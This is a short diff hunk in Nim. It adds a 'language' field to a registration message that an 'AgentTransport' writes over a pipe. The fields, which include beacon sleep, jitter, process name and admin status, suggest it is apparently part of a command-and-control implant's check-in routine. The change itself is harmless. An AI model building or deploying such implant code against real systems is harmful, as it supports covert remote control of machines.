@@ -84,7 +84,8 @@ proc register*(t: var AgentTransport): bool =
     "sleep_sec":    SleepSec,
     "jitter_pct":   JitterPct,
     "process_name": exeName(),
-    "is_admin":     false
+    "is_admin":     false,
+    "language":     "nim"
   }
   pipeWriteMsg(t.pipe, cast[seq[byte]]($req))
   let resp = pipeReadMsg(t.pipe)
